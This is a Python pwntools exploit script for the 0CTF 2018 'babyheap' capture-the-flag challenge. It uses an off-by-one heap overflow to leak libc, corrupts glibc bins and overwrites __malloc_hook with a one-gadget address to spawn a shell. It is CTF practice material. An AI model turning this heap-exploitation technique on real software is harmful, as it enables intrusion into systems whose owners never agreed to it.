from pwn import *
#0CTF 2018 - babyheap

context.log_level='debug'

def Allocate(size):
	s.recvuntil('Command: ')
	s.sendline('1')
	s.recvuntil('Size: ')
	if size > 88:
		size=88
	s.sendline(str(size))

def Update(index,size,content):	
        s.recvuntil('Command: ')
        s.sendline('2')
	s.recvuntil('Index: ')
	s.sendline(str(index))
	s.recvuntil('Size: ')
	s.sendline(str(size))
	s.recvuntil('Content: ')
	s.send(content)

def Delete(index):
        s.recvuntil('Command: ')
        s.sendline('3')
        s.recvuntil('Index: ')
        s.sendline(str(index))

def View(index,until=False):
        s.recvuntil('Command: ')
        s.sendline('4')
        s.recvuntil('Index: ')
        s.sendline(str(index))	

	if until is not False:
		s.recvuntil(until)

if __name__ == '__main__':

	s=process('./babyheap')

	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	
	Allocate(0x58) #index 0
	Allocate(0x58) #index 1
	Allocate(0x58) #index 2
	Allocate(0x58) #index 3
	Allocate(0x58) #index 4

	Update(0,0x58+1,'A'*0x50+'\x00'*0x8+'\xc1')
	Delete(1)
	
	Allocate(0x58) #index 1
	View(2,until='Chunk[2]: ')
	
	libc_leak=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=libc_leak-0x3c4b78

	main_arena=libc_leak-88
	
	__free_hook=libc_base+libc.symbols['__free_hook']
	__malloc_hook=libc_base+libc.symbols['__malloc_hook']

	print "libc_leak: "+str(hex(libc_leak))

	print str(hex(__free_hook))
	print str(hex(__malloc_hook))

	#Can`t Use faskbin attack!!! => Unsorted bin attack!!

	Update(1,0x58+1,'A'*0x50+'\x00'*0x8+'\x51')
	Update(2,0x50,p64(libc_leak)*2+'\x00'*0x30+p64(0x50)+p64(0x60))

	'''
	fastbins
	0x20: 0x0
	0x30: 0x0
	0x40: 0x0
	0x50: 0x55db28eb10c0
	0x60: 0x0
	0x70: 0x0
	0x80: 0x0

	unsortedbin
	all: 0x55db28eb10c0 
	smallbins
	empty
	largebins
	empty
	'''
	Delete(2)

	Allocate(0x18) #index 2

	Update(1,0x58+1,'\x00'*0x58+'\x51')
	Update(2,0x8,p64(main_arena+37))

	Allocate(0x40)	
	#have to need in main_arena+88 in unsorted_bin
	Update(5,0x30,p64(0x0)*3+p64(0x21)+p64(libc_leak)*2) 
	Delete(1)

	#If prev inuse is not setting, such as '\ x56' at the beginning of the heap address,
	#Exploit Possible
	Allocate(0x40) #index 1

	Update(1,0x2b,'\x00'*(3+0x20)+p64(main_arena-0x33))
	
	Allocate(0x40) #index 6

	payload='\x00'*19
	payload+=p64(libc_base+0x4526a)

	Update(6,len(payload),payload)

	Allocate(50) #/bin/sh!! Shell acquire..

        print "libc_leak: "+str(hex(libc_leak))
        print str(hex(__free_hook))
        print str(hex(__malloc_hook))
	
	s.interactive()
